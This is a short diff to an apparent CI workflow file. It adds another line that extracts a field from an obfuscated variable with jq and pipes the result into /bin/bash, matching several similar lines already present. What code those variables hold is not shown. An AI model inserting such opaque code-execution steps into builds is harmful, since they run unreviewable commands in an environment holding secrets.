@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$kepk000" | jq -r .elx04 | /bin/bash
           printf '%s' "$sdd12327" | jq -r .wwe022 | /bin/bash
           echo $ufzr5073 | jq -r .qc592 | /bin/bash
+          printf '%s' "$lunpg049" | jq -r .elst375 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
